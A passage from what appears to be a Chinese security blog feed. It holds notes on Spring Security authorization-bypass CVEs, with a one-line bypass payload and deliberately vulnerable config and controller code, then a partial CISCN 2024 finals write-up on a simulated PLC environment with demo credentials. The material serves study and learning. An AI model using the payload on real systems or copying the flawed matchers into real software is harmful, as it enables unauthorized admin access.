function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>controller配置：只能对<code>/admin/**</code>这种匹配所有路径的语法才能生效，如果写死了<code>/admin/api</code>，这样子是无法绕过的，因为就算绕过权限校验，但是程序无法匹配到路由</p><h2 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http">/admin/%0a/admin/%0d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>更新版本</p><p>或者感觉可以写死路由路径</p><hr><h1 id="CVE-2022-31692-（forward-amp-include-转发）"><a href="#CVE-2022-31692-（forward-amp-include-转发）" class="headerlink" title="CVE-2022-31692 （forward&amp;include 转发）"></a>CVE-2022-31692 （forward&amp;include 转发）</h1><p>当使用Spring  Security的时候，一般会创建一个<code>SecurityFilterChain</code>来为特定的路由设置权限，路由A为匿名访问权限，路由B为高权限，如果在Controller中定义低权限A路由return的时候，使用了<code>forward</code>或<code>include</code>请求，将会导致将低权限的请求转发或包含到一个更高权限的安全端点，从而实现越权</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecdemo2<span class="token punctuation">.</span>demos</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> antMatchersConfig <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http                <span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/forward"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                .antMatchers("/**").permitAll();</span><span class="token comment">//                .antMatchers("/test/**").permitAll();</span>        <span class="token comment">// @formatter:on</span>        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @formatter:off</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">InMemoryUserDetailsManager</span> <span class="token function">userDetailsService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserDetails</span> user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token function">withDefaultPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">username</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryUserDetailsManager</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @formatter:on</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecdemo2<span class="token punctuation">.</span>demos<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/forward"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//    @GetMapping("/forward")</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"include:/admin"</span><span class="token punctuation">;</span>        <span class="token comment">//return "forward:/admin";</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/api"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">adminapi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello adminapi"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test/api"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">testapi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello testapi"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    @RequestMapping(value = &#123;"/**"&#125;, method = &#123;RequestMethod.GET&#125;)</span><span class="token comment">//    @ResponseBody</span><span class="token comment">//    public String guest() &#123;</span><span class="token comment">//        return "hello guest";</span><span class="token comment">//    &#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="CVE-2023-34034（WebFlux）"><a href="#CVE-2023-34034（WebFlux）" class="headerlink" title="CVE-2023-34034（WebFlux）"></a>CVE-2023-34034（WebFlux）</h2><p>在Spring Security中，<code>ServerHttpSecurity</code>和<code>HttpSecurity</code>分别用于配置WebFlux和Web MVC应用程序的安全性</p><p>影响版本：</p><ul><li>6.1.0 to 6.1.1</li><li>6.0.0 to 6.0.4</li><li>5.8.0 to 5.8.4</li><li>5.7.0 to 5.7.9</li><li>5.6.0 to 5.6.11</li></ul><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">authorizeExchange</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"admin/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token comment">// 没有以 / 为开始</span>                <span class="token punctuation">.</span><span class="token function">anyExchange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>controller：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;趁热打铁v2，虽然实际上是纯记录用的&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://xz.aliyun.com/t/13235&quot;&gt;https://xz.aliyun.com/t/13235&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN决赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/</id>
    <published>2024-07-12T02:29:03.000Z</published>
    <updated>2024-08-31T02:22:55.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2024.7.20-21成都</p><p>NISA-WhySerious位37全国二等奖</p><span id="more"></span><p>wp参考：</p><p><a href="https://blog.hxzzz.asia/archives/192/">https://blog.hxzzz.asia/archives/192/</a></p><p><a href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3">https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3</a></p><hr><h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>过…过样例？</p><p>本关考验你中译中的能力（x</p><p>我就看了前两个任务，队友tql，连通俩宵ak了build</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721222456197.png" alt="image-20240721222456197"></p><h2 id="新手任务"><a href="#新手任务" class="headerlink" title="新手任务"></a>新手任务</h2><h3 id="背景应用了解"><a href="#背景应用了解" class="headerlink" title="背景应用了解"></a>背景应用了解</h3><h4 id="模拟工程师登录流程"><a href="#模拟工程师登录流程" class="headerlink" title="模拟工程师登录流程"></a>模拟工程师登录流程</h4><blockquote><p>在工程师用户（instance&#x2F;engineer&#x2F;user)目录下，编写engineer_login.msg， 填充工程师用户名与口令, 而后试运行users_login.sh，确认用户登录成功。</p></blockquote><p>engineer_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用json格式定义了cube架构中一个格式为（GENERAL_RETURN,STRING)的数据项，这个数据项是一个通用数据项，由两个字符串name和return_value组成：</p><ul><li>name用来描述数据项的类型或用途，这里name取值为login，表示该数据项用于登录</li><li>return_value则填充该数据项具体内容，return_value的引号内则按照“用户名：口令”的方式填充内容</li></ul><p>注：用户名和口令信息在管理中心工作目录(instance&#x2F;monitor&#x2F;center)里寻找</p><p><a id="user.list">instance&#x2F;monitor&#x2F;center&#x2F;user.list</a></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"SERVER_STATE"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_MONITOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"li"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhou"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"wu"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是填入engineer_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后运行users_login.sh即可</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712104227225.png" alt="image-20240712104227225"></p><hr><h4 id="模拟逻辑代码上传"><a href="#模拟逻辑代码上传" class="headerlink" title="模拟逻辑代码上传"></a>模拟逻辑代码上传</h4><blockquote><p>在2024buildup&#x2F;src&#x2F;logic&#x2F;thermostat_logic目录下写了一个模拟PLC行为的代码，用其源码thermostat_logic.c来模拟PLC源码，其编译后的动态库libthermostat_logic.so来模拟PLC逻辑。请在工程师用户目录编写code_upload.msg，填写正确的上传代码信息，试运行并完成代码上传功能。</p></blockquote><p>instance&#x2F;engineer&#x2F;user&#x2F;code_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>(PLC_ENGINEER,LOGIC_UPLOAD)</code>数据结构：</p><table><thead><tr><th>元素名称</th><th>元素类型</th><th>元素大小</th><th>信息内容</th><th>备注</th></tr></thead><tbody><tr><td>plc_devname</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>设备的名称</td><td></td></tr><tr><td>logic_filename</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>代码文件的名称</td><td></td></tr><tr><td>type</td><td>ENUM</td><td>4字节</td><td>文件类型</td><td>使用<strong>enum_plc_file_type枚举</strong></td></tr><tr><td>uuid</td><td>UUID</td><td>32字节</td><td>代码的摘要值</td><td></td></tr><tr><td>author</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>代码作者的名称</td><td></td></tr><tr><td>uploader</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>上传行为执行者名称</td><td></td></tr><tr><td>time</td><td>INT</td><td>4字节</td><td>上传行为执行时间</td><td></td></tr></tbody></table><p>修改code_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712110019651.png" alt="image-20240712110019651"></p><hr><h4 id="模拟二进制逻辑上传"><a href="#模拟二进制逻辑上传" class="headerlink" title="模拟二进制逻辑上传"></a>模拟二进制逻辑上传</h4><blockquote><p>编辑task_1_1.sh，删除对应任务的sh前面的#号，打开注释行，并在工程师用户目录下编写bin_upload.msg，填写正确的plc逻辑信息，再运行task_1_1.sh,以实现模拟的二进制逻辑上传。</p></blockquote><p>bin_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看一下type对应的枚举类型：</p><p>文件类型定义<code>emu_plc_file_type</code>（位于PLC模拟操作的plc_emu.json）</p><table><thead><tr><th>枚举项名称</th><th>枚举数值</th><th>内容</th><th>备注</th></tr></thead><tbody><tr><td>FILE_CODE</td><td>0x01</td><td>代码文件</td><td></td></tr><tr><td>FILE_LOGIC</td><td>0x02</td><td>PLC逻辑文件</td><td>由对应代码文件生成</td></tr><tr><td>FILE_DESC</td><td>0x10</td><td>描述文件</td><td>保留待以后选用</td></tr><tr><td>FILE_RULE</td><td>0x20</td><td>制度文件</td><td>保留待以后选用</td></tr></tbody></table><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712111831356.png" alt="image-20240712111831356"></p><p>修改bin_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"libthermostat_logic.so"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_LOGIC"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712120702394.png" alt="image-20240712120702394"></p><hr><h4 id="模拟PLC逻辑启动"><a href="#模拟PLC逻辑启动" class="headerlink" title="模拟PLC逻辑启动"></a>模拟PLC逻辑启动</h4><blockquote><p>编辑task_1_1.sh，打开“启动plc设备模拟”提示后面的注释项，运行task_1_1.sh</p></blockquote><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121057598.png" alt="image-20240712121057598"></p><p>观察plc设备工作目录instance&#x2F;plc&#x2F;device&#x2F;下的message_log目录，发现其增加了logic_send.log文件</p><blockquote><p>这里message_log目录记录的是各用例模拟运行的过程，logic_send则是在设备工作目录下配置的系统自动监控流程的模拟业务流</p></blockquote><p>instance&#x2F;plc&#x2F;device&#x2F;router_policy.cfg</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121529217.png" alt="image-20240712121529217"></p><p>主要看下半部分</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"policy_head"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_send"</span><span class="token punctuation">,</span>       <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"DELIVER"</span><span class="token punctuation">,</span>        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"MATCH_RULES"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"OR"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MODBUS_CMD"</span><span 